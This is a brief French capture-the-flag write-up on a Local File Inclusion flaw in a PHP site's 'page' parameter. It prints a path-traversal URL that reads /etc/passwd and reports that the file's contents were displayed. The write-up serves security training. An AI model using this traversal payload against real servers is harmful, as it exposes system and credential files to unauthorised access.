# Darkly - Writeup : Local File Inclusion (LFI)

## Analyse

Le paramètre `page` dans l’URL est utilisé pour inclure des fichiers côté serveur :

```
/index.php?page=...
```

Aucune validation n’est appliquée sur cette valeur.

## Exploitation

En modifiant le paramètre, il est possible d’accéder à des fichiers système :

```
http://10.19.202.124/index.php?page=../../../../../../../etc/passwd
```

## Résultat

Le contenu de `/etc/passwd` est affiché, confirmant une vulnérabilité de type Local File Inclusion.

## Conclusion

Le paramètre `page` permet d’accéder à des ressources arbitraires sur le serveur en manipulant le chemin fourni par l’utilisateur.
